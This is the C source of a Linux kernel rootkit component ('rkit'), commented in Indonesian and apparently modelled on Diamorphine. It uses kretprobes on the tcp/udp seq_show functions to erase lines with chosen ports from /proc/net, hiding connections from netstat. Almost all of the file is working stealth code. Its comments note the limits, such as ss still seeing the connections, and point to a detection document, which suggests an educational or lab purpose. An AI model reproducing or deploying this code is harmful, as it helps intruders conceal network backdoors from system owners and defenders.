/*
 * hook_seq.c — sembunyikan KONEKSI jaringan dari /proc/net/{tcp,udp}{,6}.
 *
 * Mekanisme (teknik era Diamorphine/adore, diadaptasi):
 *   tiap baris /proc/net/* diformat oleh fungsi *_seq_show ke buffer
 *   seq_file. Kita pasang KRETPROSE: setelah show selesai, kalau baris
 *   mengandung port milik kita -> kosongkan count -> baris tidak
 *   dicetak -> netstat -tulpn tidak melihatnya.
 *
 * Format baris (IPv4 & IPv6 sama polanya):
 *   "  0: 0100007F:0016 00000000:000001 ..."   (IPv6:32 digit tanpa ':')
 *   -> port LOKAL  =4 hex setelah ':' KE-2
 *   -> port REMOTE =4 hex setelah ':' KE-3
 *
 * Catatan jujur (biar tidak overclaim — lihat docs/DETECTION.md):
 *   - port cocok di baris manapun -> bisa ikut menyembunyikan koneksi
 *     lain yang kebetulan menyebut port sama
 *   - `ss` memakai netlink sock_diag (jalur BERBEDA dari /proc/net/tcp)
 *     -> sebagian alat tetap bisa melihat. Inilah kenapa DETECTION.md
 *     menyuruh membandingkan netstat vs ss.
 */
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kernel.h>        /* snprintf */
#include <linux/printk.h>        /* pr_info/pr_warn */
#include "rkit.h"

struct seq_save {
	struct seq_file *m;
};

/* parse tepat4 digit hex dari p (aman: dibatasi end) */
static bool hex4(const char *p, const char *end, unsigned int *out)
{
	unsigned int v = 0;
	int i;

	if (p + 4 > end)
		return false;
	for (i = 0; i < 4; i++) {
		char c = p[i];

		v <<= 4;
		if (c >= '0' && c <= '9')
			v |= c - '0';
		else if (c >= 'a' && c <= 'f')
			v |= c - 'a' + 10;
		else if (c >= 'A' && c <= 'F')
			v |= c - 'A' + 10;
		else
			return false;
	}
	*out = v;
	return true;
}

static const char *next_colon(const char *p, const char *end)
{
	while (p < end && *p != ':')
		p++;
	return p < end ? p : NULL;
}

static int seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct seq_save *s = (struct seq_save *)ri->data;

	s->m = (struct seq_file *)regs->di;   /* arg1 syscall (x86_64) */
	return 0;
}

static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct seq_save *s = (struct seq_save *)ri->data;
	const char *buf, *end, *c1, *c2, *c3;
	unsigned int port;

	(void)regs;
	if (!s->m || !s->m->buf || !s->m->count || !rk_any_ports())
		return 0;

	buf = s->m->buf;
	end = buf + s->m->count;

	/* lewati kolon pertama (field "sl"), ambil port lokal */
	c1 = next_colon(buf, end);
	if (!c1)
		return 0;
	c2 = next_colon(c1 + 1, end);
	if (!c2 || !hex4(c2 + 1, end, &port))
		return 0;
	if (port <= 0xffff && rk_is_hidden_port((u16)port)) {
		s->m->count = 0;              /* buang baris */
		return 0;
	}
	/* port remote = kolon ketiga */
	c3 = next_colon(c2 + 1, end);
	if (c3 && hex4(c3 + 1, end, &port) &&
	    port <= 0xffff && rk_is_hidden_port((u16)port))
		s->m->count = 0;
	return 0;
}

static struct kretprobe rp_seq[4];
static const char *const rp_seq_syms[4] = {
	"tcp4_seq_show", "tcp6_seq_show",
	"udp4_seq_show", "udp6_seq_show",
};

int rk_seq_init(void)
{
	int i, ret, got = 0;

	for (i = 0; i < 4; i++) {
		memset(&rp_seq[i], 0, sizeof(rp_seq[i]));
		rp_seq[i].kp.symbol_name = rp_seq_syms[i];
		rp_seq[i].handler = seq_post;
		rp_seq[i].entry_handler = seq_entry;
		rp_seq[i].data_size = sizeof(struct seq_save);
		rp_seq[i].maxactive = 16;
		ret = register_kretprobe(&rp_seq[i]);
		if (ret == 0)
			got++;
	}
	if (!got)
		return -ENOENT;
	if (got < 4)
		pr_warn("rkit: conn-hide hanya %d/4 simbol terpasang\n", got);
	pr_info("rkit: hook conn-hide aktif (%d/4 seq_show)\n", got);
	return 0;
}

void rk_seq_exit(void)
{
	int i;

	for (i = 0; i < 4; i++)
		unregister_kretprobe(&rp_seq[i]);
}
